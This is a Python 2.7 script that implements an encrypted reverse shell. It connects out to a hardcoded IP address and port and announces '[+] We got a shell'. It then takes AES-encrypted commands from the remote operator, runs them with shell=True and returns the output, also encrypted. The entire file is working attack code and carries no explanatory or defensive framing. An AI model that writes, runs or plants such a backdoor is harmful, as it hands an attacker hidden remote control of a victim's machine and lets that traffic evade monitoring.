#!/usr/bin/env python2.7

import subprocess
import socket 
import os
from Crypto.Cipher import AES
from sys import exit
import base64

PADDING = '{'

passphrase = b'QWERTY1234567890'

global cipher
cipher = AES.new(passphrase, AES.MODE_ECB)

pad = lambda s: s + (16 - len(s) % 16) * PADDING

encrypt = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
decrypt = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

def processData(s):
	global cipher
	while True:
		data = s.recv(2048)
		strData = decrypt(cipher, data)

		if strData.lower() == 'null':
			nullmessage = str.encode(os.getcwd() + '> ')
			nullmessage = encrypt(cipher, nullmessage)
			s.send(nullmessage)

		if strData.lower() == 'exit':
			break

		if strData[:2] == "cd":
			try:
				os.chdir(strData[3:])
				
			except OSError as e:
				pass

		if strData != 'null':
			try:	
				proc = subprocess.Popen(strData, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				stream = proc.stdout.read() + proc.stderr.read()
				message = stream + str.encode(os.getcwd() + '> ')
				message = encrypt(cipher, message)
				s.send(message)
				
			except socket.error as e:
				print(e)
				
	s.close()	
	exit(1)

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("192.168.188.186", 1337))
	msg = "[+] We got a shell \r\n"
	msg = encrypt(cipher, msg)
	s.send(msg)
	processData(s)

except socket.error as msg:
	print(msg)
